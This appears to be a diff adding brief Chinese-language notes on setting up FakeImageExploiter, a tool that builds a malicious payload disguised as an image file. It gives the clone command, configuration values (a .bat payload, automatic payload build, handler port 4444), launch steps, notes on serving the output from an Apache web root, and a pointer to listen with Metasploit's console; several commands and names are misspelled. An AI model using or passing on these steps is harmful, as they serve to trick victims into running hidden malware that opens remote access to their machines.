@@ -1,0 +1,20 @@
+git clone https://github.com/r00t-3xp10it/FakeImageExploiter.git
+
+
+###配置setting文件
+
+PAYLOAD_EXETNSION=bat
+BYPASS_RH=NO
+AUTO_PAYLOAD_BUILD=YES 
+AGENT_HANLER_PORT=4444
+
+
+###启动Fake Image Exploiter主程序
+
+Cd FakeImageExploiter
+
+./ FakeImageExploiter.sh
+
+###一个为本机Apache2 web服务的根目录下的.zip文件，另外为FakeImageExploiter输出文件夹（output）下的隐藏后缀恶意图片文件
+使用msfconcle
+监听端口
